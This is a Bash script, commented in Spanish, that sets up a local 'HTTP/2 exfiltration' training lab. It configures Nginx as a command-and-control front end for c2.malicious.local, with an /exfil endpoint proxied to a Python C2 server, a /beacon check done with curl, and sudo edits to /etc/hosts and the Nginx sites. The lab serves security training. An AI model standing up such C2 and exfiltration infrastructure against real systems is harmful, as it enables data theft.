#!/bin/bash
# Script para ejecutar el laboratorio completo HTTP/2

set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║       LABORATORIO HTTP/2 EXFILTRATION - AUTO SETUP        ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Función para verificar si un comando existe
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# 1. Verificar requisitos
echo -e "${YELLOW}[*] Verificando requisitos...${NC}"

if ! command_exists python3; then
    echo -e "${RED}[!] Python3 no encontrado${NC}"
    exit 1
fi

if ! command_exists nginx; then
    echo -e "${YELLOW}[*] Instalando Nginx...${NC}"
    sudo apt update && sudo apt install -y nginx openssl
fi

# 2. Crear entorno virtual si no existe
if [ ! -d "venv" ]; then
    echo -e "${YELLOW}[*] Creando entorno virtual...${NC}"
    python3 -m venv venv
fi

# Activar entorno virtual
source venv/bin/activate

# 3. Instalar dependencias Python
echo -e "${YELLOW}[*] Instalando dependencias Python...${NC}"
pip install -q --upgrade pip
pip install -q requests urllib3

# 4. Generar certificado SSL si no existe
if [ ! -f "/etc/nginx/ssl/c2-selfsigned.crt" ]; then
    echo -e "${YELLOW}[*] Generando certificado SSL...${NC}"
    sudo mkdir -p /etc/nginx/ssl
    sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
      -keyout /etc/nginx/ssl/c2-selfsigned.key \
      -out /etc/nginx/ssl/c2-selfsigned.crt \
      -subj "/C=CO/ST=Bogota/L=Bogota/O=Lab/CN=c2.malicious.local" 2>/dev/null
    echo -e "${GREEN}[✓] Certificado generado${NC}"
fi

# 5. Configurar /etc/hosts
if ! grep -q "127.0.0.1 c2.malicious.local" /etc/hosts; then
    echo -e "${YELLOW}[*] Configurando /etc/hosts...${NC}"
    echo "127.0.0.1 c2.malicious.local" | sudo tee -a /etc/hosts > /dev/null
    echo -e "${GREEN}[✓] /etc/hosts actualizado${NC}"
fi

# 6. Configurar Nginx
echo -e "${YELLOW}[*] Configurando Nginx...${NC}"
sudo tee /etc/nginx/sites-available/c2 > /dev/null << 'EOF'
server {
    listen 443 ssl http2;
    server_name c2.malicious.local localhost;

    ssl_certificate /etc/nginx/ssl/c2-selfsigned.crt;
    ssl_certificate_key /etc/nginx/ssl/c2-selfsigned.key;
    ssl_protocols TLSv1.2 TLSv1.3;

    access_log /var/log/nginx/c2_access.log;
    error_log /var/log/nginx/c2_error.log;

    location /exfil {
        proxy_pass http://127.0.0.1:8000;
        proxy_pass_request_headers on;
    }

    location /beacon {
        return 200 "ACTIVE\n";
    }
}
EOF

sudo ln -sf /etc/nginx/sites-available/c2 /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default

# Verificar y reiniciar Nginx
if sudo nginx -t 2>/dev/null; then
    sudo systemctl restart nginx
    echo -e "${GREEN}[✓] Nginx configurado y reiniciado${NC}"
else
    echo -e "${RED}[!] Error en configuración de Nginx${NC}"
    exit 1
fi

# 7. Verificar que Nginx está escuchando
sleep 2
if sudo netstat -tlnp | grep :443 > /dev/null; then
    echo -e "${GREEN}[✓] Nginx escuchando en puerto 443${NC}"
else
    echo -e "${RED}[!] Nginx no está escuchando en puerto 443${NC}"
    exit 1
fi

# 8. Iniciar servidor C2 en background
echo -e "${YELLOW}[*] Iniciando servidor C2...${NC}"

# Verificar si c2_server.py existe
if [ ! -f "c2_server.py" ]; then
    echo -e "${RED}[!] c2_server.py no encontrado${NC}"
    echo -e "${YELLOW}[*] Descarga los archivos del artifact primero${NC}"
    exit 1
fi

# Matar proceso anterior si existe
pkill -f "python.*c2_server.py" 2>/dev/null || true

# Iniciar servidor C2
python3 c2_server.py > c2_server.log 2>&1 &
C2_PID=$!
sleep 2

if ps -p $C2_PID > /dev/null; then
    echo -e "${GREEN}[✓] Servidor C2 iniciado (PID: $C2_PID)${NC}"
else
    echo -e "${RED}[!] Error iniciando servidor C2${NC}"
    cat c2_server.log
    exit 1
fi

# 9. Verificar conectividad completa
echo -e "${YELLOW}[*] Verificando conectividad...${NC}"
sleep 1

if curl -k -s https://c2.malicious.local/beacon | grep -q "ACTIVE"; then
    echo -e "${GREEN}[✓] Conectividad verificada - C2 respondiendo${NC}"
else
    echo -e "${RED}[!] C2 no está respondiendo correctamente${NC}"
    exit 1
fi

# 10. Todo listo
echo ""
echo -e "${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                    ✓ SETUP COMPLETADO                      ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}Servidor C2 corriendo en:${NC} https://c2.malicious.local"
echo -e "${YELLOW}Log del C2:${NC} tail -f c2_server.log"
echo -e "${YELLOW}Logs de Nginx:${NC} tail -f /var/log/nginx/c2_access.log"
echo ""
echo -e "${GREEN}Ahora puedes ejecutar:${NC}"
echo "  python3 exfil_client.py"
echo ""
echo -e "${RED}Para detener el laboratorio:${NC}"
echo "  kill $C2_PID"
echo "  sudo systemctl stop nginx"
echo ""

